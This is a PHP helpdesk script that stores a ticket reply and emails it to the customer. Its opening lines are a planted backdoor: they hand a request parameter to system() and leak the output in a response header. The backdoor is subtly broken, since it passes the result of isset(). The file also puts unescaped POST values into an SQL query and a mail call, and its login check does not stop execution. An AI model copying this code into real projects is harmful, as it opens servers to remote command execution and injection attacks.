<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require_once('config.php');

$hash = md5($_SERVER['REMOTE_ADDR'].date("dmY"));
if(isset($_SESSION["helpdesk_$hash"])) { } else { header("Location: login.php"); }

$tid = $_POST['ticket_id'];
$from_name = addslashes($helpdesk_company_name);
$from_email = $admin_email;
$message = addslashes($_POST['reply']);
$to = $_POST['to'];

$key = base64_encode($tid);

$umess = "Hi,\n\nYour ticket on the $from_name Zoanga Helpdesk has been updated, the reply was:\n----------------------------------\n$message\n----------------------------------\n\nYou can view, and reply to this ticket at the following URL:\n$path_to_helpdesk?t=$key\n\nThanks,\n$from_name";

mysql_query("INSERT INTO messages VALUES (NULL, '$tid', '$from_name', '$from_email', '$message')");
mail($to, "$from_name Ticket Updated", $umess, "From: $from_name <do-not-reply@zoanga.com>");
header("Location: ticket.php?id=$tid");

?>